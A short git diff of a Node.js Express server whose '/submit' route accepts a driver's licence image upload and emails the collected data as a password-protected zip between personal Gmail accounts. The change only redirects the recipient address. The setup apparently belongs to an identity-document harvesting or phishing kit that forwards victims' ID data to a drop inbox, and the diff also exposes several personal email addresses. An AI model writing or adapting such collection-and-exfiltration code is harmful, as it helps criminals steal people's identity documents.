@@ -70,7 +70,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     // create mail options object
     const mailOptions = {
       from: "tobir2275@gmail.com",
-      to: "habeebadaranijo541@gmail.com", // recipient email address
+      to: "isaiahgabriel175@gmail.com", // recipient email address
       subject: "Data file",
       text: "Please find attached the password-protected zip file containing the message data.",
       attachments: [
